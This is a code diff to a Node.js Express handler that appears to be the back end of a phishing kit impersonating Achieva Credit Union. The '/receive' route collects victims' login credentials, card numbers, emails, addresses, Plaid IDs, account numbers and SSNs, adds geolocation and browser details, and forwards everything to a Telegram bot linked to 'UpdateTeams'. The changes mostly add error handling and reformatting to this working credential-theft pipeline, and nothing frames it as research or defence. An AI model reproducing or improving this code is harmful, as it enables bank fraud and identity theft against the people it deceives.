@@ -183,145 +183,153 @@ app.post('/receive', async (req, res) => {
   let message = '';
   let myObject = req.body;
 
-  const sendAPIRequest = async (ipAddress) => {
+  try {
+    const sendAPIRequest = async (ipAddress) => {
+      try {
         const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-		console.log(apiResponse.data);
+        console.log(apiResponse.data);
         return apiResponse.data;
+      } catch (error) {
+        console.error("Error in API request:", error);
+        throw error;
+      }
     };
-  
 
-  const ipAddress = getClientIp(req);
-  const ipAddressInformation = await sendAPIRequest(ipAddress);
-  const userAgent = req.headers["user-agent"];
-  const systemLang = req.headers["accept-language"];
+    const ipAddress = getClientIp(req);
+    const ipAddressInformation = await sendAPIRequest(ipAddress);
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
 
-  const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
-  console.log(myObjects);
+    const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
+    console.log(myObjects);
 
-  if (myObjects.includes('username')) {
-    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-               `👤 LOGIN \n\n`;
+    if (myObjects.includes('username')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 LOGIN \n\n`;
 
-    for (const key of myObjects) {
-      if (key !== 'visitor') {
+      for (const key of myObjects) {
+        if (key !== 'visitor') {
+          console.log(`${key}: ${myObject[key]}`);
+          message += `${key}: ${myObject[key]}\n`;
+        }
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
+        `CITY             : ${ipAddressInformation.location.city}\n` +
+        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+        `💻 SYSTEM INFO\n` +
+        `USER AGENT       : ${userAgent}\n` +
+        `SYSTEM LANGUAGE  : ${systemLang}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      res.send('dn');
+    }
+
+    if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('Billing Address')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 CARD INFO\n\n`;
+
+      for (const key of myObjects) {
         console.log(`${key}: ${myObject[key]}`);
         message += `${key}: ${myObject[key]}\n`;
       }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      let url;
+      if (plaid == "on") {
+        url = "/link?step=1";
+      } else {
+        url = "https://www.achievacu.com/";	
+      }
+
+      res.send({ url: url });
     }
-    
-    message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
-      `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
-      `CITY             : ${ipAddressInformation.location.city}\n` +
-      `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
-      `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
-      `COUNTRY          : ${ipAddressInformation.country.name}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
-      `💻 SYSTEM INFO\n` +
-      `USER AGENT       : ${userAgent}\n` +
-      `SYSTEM LANGUAGE  : ${systemLang}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
-      
+
+    if (myObjects.includes('userid')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 PLAID INFO\n\n`;
+
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+    }
+
+    if (myObjects.includes('email')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 EMAIL INFO\n\n`;
+
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
       res.send('dn');
-  }
-
-  if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('Billing Address')) {
-    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO\n\n`;
-
-    for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
     }
-    
-    message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    let url;
-      if(plaid == "on"){
-      	url = "/link?step=1";
-      	}else{
-      	url = "https://www.achievacu.com/";	
-      		}
+    if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 ADDRESS INFO\n\n`;
 
-    res.send({ url:url });
-  }
-  
-  if (myObjects.includes('userid')) {
-    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-               `👤 PLAID INFO\n\n`;
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
 
-    for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      res.send('dn');
     }
-    
-    message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
-      
-  }
-  
-  if (myObjects.includes('email')) {
-    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-               `👤 EMAIL INFO\n\n`;
 
-    for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
+    if (myObjects.includes('memberNumber') || myObjects.includes('accountNumber') || myObjects.includes('ssn')) {
+      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
+                 `👤 USER ACCOUNT INFO\n\n`;
+
+      for (const key of myObjects) {
+        console.log(`${key}: ${myObject[key]}`);
+        message += `${key}: ${myObject[key]}\n`;
+      }
+
+      message += `🌍 GEO-IP INFO\n` +
+        `IP ADDRESS       : ${ipAddress}\n` +
+        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
+
+      res.send('dn');
     }
-    
-    message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
 
-    res.send('dn');
+    console.log(message); 
+    const sendMessage = sendMessageFor(botToken, chatId); 
+    await sendMessage(message);
+
+  } catch (error) {
+    console.error("Error in processing request:", error);
+    res.status(500).send('An error occurred while processing the request.');
   }
-
-  if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
-    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-               `👤 ADDRESS INFO\n\n`;
-
-    for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
-    }
-    
-    message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-    res.send('dn');
-  }
-  
-  if (myObjects.includes('memberNumber') || myObjects.includes('accountNumber') || myObjects.includes('ssn')) {
-    message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
-               `👤 USER ACCOUNT INFO\n\n`;
-
-    for (const key of myObjects) {
-      console.log(`${key}: ${myObject[key]}`);
-      message += `${key}: ${myObject[key]}\n`;
-    }
-    
-    message += `🌍 GEO-IP INFO\n` +
-      `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-      `💬 Telegram: https://t.me/UpdateTeams\n`;
-
-    res.send('dn');
-  }
-
-  console.log(message); 
-  const sendMessage = sendMessageFor(botToken, chatId); 
-  sendMessage(message);
 });
-
 
 // Route handler for login pages
 app.get('/Authenticate', async (req, res) => {
